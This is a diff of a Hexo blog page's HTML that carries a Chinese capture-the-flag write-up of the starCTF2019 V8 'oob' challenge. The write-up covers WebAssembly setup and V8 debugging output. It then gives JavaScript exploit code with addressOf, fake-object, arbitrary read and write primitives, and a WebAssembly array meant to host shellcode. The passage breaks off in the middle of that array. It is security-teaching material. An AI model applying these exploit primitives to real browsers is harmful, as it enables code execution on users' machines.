@@ -1,53 +1,117 @@
+
+
 <!DOCTYPE html>
-<html lang="zh-CN">
-
-
+<html lang="zh-CN" data-default-color-scheme=auto>
 
 
 
 <head>
   <meta charset="UTF-8">
+
   <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
-  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <link rel="icon" href="/css/images/bg/favicon.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="摸鱼">
   <meta name="author" content="Aluvion">
   <meta name="keywords" content="">
+  
+    <meta name="description" content="前言 开坑Chrome浏览器漏洞，找个简单的开始入手。 跟PHP的UAF玩法很像，触类旁通不难理解。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chrome浏览器漏洞入门">
+<meta property="og:url" content="http://yoursite.com/2021/03/16/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="Twings">
+<meta property="og:description" content="前言 开坑Chrome浏览器漏洞，找个简单的开始入手。 跟PHP的UAF玩法很像，触类旁通不难理解。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/css/images/starctf2019_oob/2021031601.png">
+<meta property="og:image" content="http://yoursite.com/css/images/starctf2019_oob/2021031602.png">
+<meta property="og:image" content="http://yoursite.com/css/images/starctf2019_oob/2021031603.png">
+<meta property="og:image" content="http://yoursite.com/css/images/starctf2019_oob/2021031604.png">
+<meta property="og:image" content="http://yoursite.com/css/images/starctf2019_oob/2021031605.png">
+<meta property="og:image" content="http://yoursite.com/css/images/starctf2019_oob/2021031606.png">
+<meta property="og:image" content="http://yoursite.com/css/images/starctf2019_oob/2021031607.png">
+<meta property="og:image" content="http://yoursite.com/css/images/starctf2019_oob/2021031608.png">
+<meta property="article:published_time" content="2021-03-16T14:22:50.000Z">
+<meta property="article:modified_time" content="2022-04-15T13:37:34.147Z">
+<meta property="article:author" content="Aluvion">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="二进制">
+<meta property="article:tag" content="浏览器">
+<meta property="article:tag" content="Chrome">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://yoursite.com/css/images/starctf2019_oob/2021031601.png">
+  
+  
+  
   <title>Chrome浏览器漏洞入门 - Twings</title>
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
-<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
-<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
-<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
 
-  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
 
 <link  rel="stylesheet" href="/css/main.css" />
 
 
-  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
 
 
-<!-- 自定义样式保持在最底部 -->
 
 
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yoursite.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 
 <body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
             data-target="#navbarSupportedContent"
@@ -63,46 +127,75 @@
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/">首页</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/archives/">归档</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/tags/">标签</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/about/">关于</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/links/">友链</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
         
         
           <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
           </li>
         
       </ul>
@@ -110,73 +203,92 @@
   </div>
 </nav>
 
-    <div class="view intro-2" id="background" parallax=true
-         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask rgba-black-light flex-center">
-          <div class="container text-center white-text fadeInUp">
-            <span class="h2" id="subtitle">
-              
-            </span>
+  
 
-            
-              
-                <p class="mt-3 post-meta">
-                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  星期二, 三月 16日 2021, 10:22 晚上
-                </p>
-              
-
-              <p class="mt-1">
-                
-                  
-                  <span class="post-meta">
-                    <i class="far fa-chart-bar"></i>
-                    5.8k 字
-                  </span>
-                
-
-                
-                  
-                  <span class="post-meta">
-                      <i class="far fa-clock"></i>
-                      27 分钟
-                  </span>
-                
-
-                
-                  <!-- 不蒜子统计文章PV -->
-                  
-                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
-                    <i class="far fa-eye" aria-hidden="true"></i>
-                    <span id="busuanzi_value_page_pv"></span> 次
-                  </span>
-                
-              </p>
-            
-          </div>
-
+<div id="banner" class="banner" parallax=true
+     style="background: url('/css/images/bg/bg5.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Chrome浏览器漏洞入门"></span>
           
         </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-03-16 22:22" pubdate>
+          2021年3月16日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          46 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
       </div>
+
+      
     </div>
+  </div>
+</div>
+
+</div>
+
   </header>
 
   <main>
     
       
 
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="container nopadding-md" id="board-ctn">
-        <div class="py-5 z-depth-3" id="board">
-          <div class="post-content mx-auto" id="post">
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Chrome浏览器漏洞入门</h1>
             
-            <div class="markdown-body">
-              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 开坑Chrome浏览器漏洞，找个简单的开始入手。</p>
+            
+              <div class="markdown-body">
+                
+                <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 开坑Chrome浏览器漏洞，找个简单的开始入手。</p>
 <p>跟PHP的UAF玩法很像，触类旁通不难理解。</p>
 <span id="more"></span>
 
@@ -187,12 +299,12 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./emsdk install latest</span><br><span class="line">/emsdk activate latest</span><br><span class="line"><span class="built_in">source</span> ./emsdk_env.sh</span><br></pre></td></tr></table></figure>
 
 <p>安装完成：</p>
-<p><img src="/css/images/starctf2019_oob/2021031601.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/starctf2019_oob/2021031601.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后编译一个简单的测试html和配套js：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#include &lt;stdio.h&gt;&#x27;</span> &gt; hello.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;int main(int argc, char ** argv) &#123;&#x27;</span> &gt;&gt; hello.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;printf(&quot;Hello, world!\n&quot;);&#x27;</span> &gt;&gt; hello.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&#125;&#x27;</span> &gt;&gt; hello.c</span><br><span class="line">emcc hello.c -s WASM=1 -o hello.html</span><br></pre></td></tr></table></figure>
 
 <p>编译结果：</p>
-<p><img src="/css/images/starctf2019_oob/2021031602.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/starctf2019_oob/2021031602.png" srcset="/img/loading.gif" lazyload></p>
 <p>可以看到会编译完成三个文件，一个html一个js和一个wasm，可以看出WebAssembly的运行机制就是由js调用wasm实现使用C等语言实现的代码。一般来说为了安全考虑，wasm不会允许用户直接调用系统函数（比如printf），wasm中只能运行数学计算、图像处理等系统无关的高级语言代码。这种通过emcc编译的方式出来的结果会比较复杂，但是可以将printf这种函数调用编译成wasm可以执行的内容，具体不明。</p>
 <p>用<a href="https://wasdk.github.io/WasmFiddle/">在线编译</a>弄个不调用函数的简单测试：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123; </span><br><span class="line">    <span class="keyword">return</span>(<span class="number">9</span>*<span class="number">9</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -269,7 +381,7 @@
 
 <p>最后得到：000018a9c7bcddf9，即对象数组中成员所在的elements属性（elements指针指向的0x18a9c7bcde80地址处），中的第一个成员0x18a9c7bcddf9（位于地址0x18a9c7bcde90处）。</p>
 <p>顺带一提，如果调试的是debug版本，修改内存之后再打印对象会发现程序错误，大概是这个样子：</p>
-<p><img src="/css/images/starctf2019_oob/2021031603.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/starctf2019_oob/2021031603.png" srcset="/img/loading.gif" lazyload></p>
 <p>参考文章2也有提到这个问题，这里我就不加以研究了。</p>
 <h3 id="starCTF2019"><a href="#starCTF2019" class="headerlink" title="starCTF2019"></a>starCTF2019</h3><p>题目地址：<a href="https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip">https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip</a></p>
 <p>题目提供了一个diff文件对源代码进行了修改，首先我们要通过这个diff文件对我们下载到的源代码进行更新和重编译。</p>
@@ -277,7 +389,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git apply oob.diff</span><br></pre></td></tr></table></figure>
 
 <p>然后查看src&#x2F;bootstrapper.cc：</p>
-<p><img src="/css/images/starctf2019_oob/2021031604.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/starctf2019_oob/2021031604.png" srcset="/img/loading.gif" lazyload></p>
 <p>可以看到补丁已经打上去了，然后我们重新编译出d8：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tools/dev/gm.py x64.release d8</span><br></pre></td></tr></table></figure>
 
@@ -342,9 +454,9 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x38400785fa69: [Function] in OldSpace</span><br><span class="line"> - map: 0x17f2a8584379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x384007842109 &lt;JSFunction (sfi = 0x828bce48039)&gt;</span><br><span class="line"> - elements: 0x14d3e7a80c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x38400785fa31 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"> - name: 0x14d3e7a84ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x384007841869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x3be236f42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance 0x38400785f871</span><br><span class="line"> - WASM function index 0</span><br><span class="line"> - properties: 0x14d3e7a80c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x0828bce404b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #name: 0x0828bce40449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #arguments: 0x0828bce40369 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #caller: 0x0828bce403d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
 
 <p>先看看很可疑的code属性：</p>
-<p><img src="/css/images/starctf2019_oob/2021031605.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/starctf2019_oob/2021031605.png" srcset="/img/loading.gif" lazyload></p>
 <p>着实可疑，再看看权限：</p>
-<p><img src="/css/images/starctf2019_oob/2021031606.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/starctf2019_oob/2021031606.png" srcset="/img/loading.gif" lazyload></p>
 <p>不可写，算了算了。context属性看起来是内置相关的东西，然后看看shared_info：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x38400785fa31</span><br><span class="line">0x38400785fa31: [SharedFunctionInfo] in OldSpace</span><br><span class="line"> - map: 0x14d3e7a809e1 &lt;Map[56]&gt;</span><br><span class="line"> - name: 0x14d3e7a84ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 144</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: 0x38400785fa09 &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - code (from data): 0x3be236f42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - function token position: -1</span><br><span class="line"> - start position: -1</span><br><span class="line"> - end position: -1</span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: 0x14d3e7a80c61 &lt;ScopeInfo[0]&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - feedback_metadata: 0x14d3e7a82a39: [FeedbackMetadata]</span><br><span class="line"> - map: 0x14d3e7a81319 &lt;Map&gt;</span><br><span class="line"> - slot_count: 0</span><br></pre></td></tr></table></figure>
 
@@ -366,11 +478,11 @@
 
 <p>然后用任意地址写把我们的命令执行shellcode写入即可，不过直接用write函数写入的时候有点问题，因为写入时需要将指针指向-0x10偏移的地方，而这个偏移对于这段汇编代码来说是一个不可读的区域，所以就会导致程序崩溃。</p>
 <p>解决的方法来自参考文章：</p>
-<p><img src="/css/images/starctf2019_oob/2021031607.png" srcset="/img/loading.gif"></p>
+<p><img src="/css/images/starctf2019_oob/2021031607.png" srcset="/img/loading.gif" lazyload></p>
 <h4 id="完整利用"><a href="#完整利用" class="headerlink" title="完整利用"></a>完整利用</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;obj&quot;</span>: <span class="string">&quot;Twings&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">o</span>) &#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = o;</span><br><span class="line">    obj_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = obj_array[<span class="number">0</span>];</span><br><span class="line">    obj_array.<span class="title function_">oob</span>(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0n</span>),</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="title function_">f2i</span>(<span class="title function_">addressOf</span>(float_array)) - <span class="number">0x10n</span>),</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getFakeObj</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> fake_array_addr = <span class="title function_">f2i</span>(<span class="title function_">addressOf</span>(fake_array)) - <span class="number">0x38n</span> + <span class="number">0x10n</span>;</span><br><span class="line">    float_array[<span class="number">0</span>] = <span class="title function_">i2f</span>(fake_array_addr);</span><br><span class="line">    float_array.<span class="title function_">oob</span>(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_obj = <span class="title function_">getFakeObj</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(<span class="title function_">f2i</span>(addr) - <span class="number">0x10n</span>)</span><br><span class="line">    <span class="keyword">return</span> fake_obj[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">addr, data</span>) &#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(<span class="title function_">f2i</span>(addr) - <span class="number">0x10n</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;write at: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(<span class="title function_">i2f</span>((<span class="title function_">f2i</span>(addr) - <span class="number">0x10n</span>)))) + <span class="string">&quot;, data: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(data)));</span><br><span class="line">    fake_obj[<span class="number">0</span>] = data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span 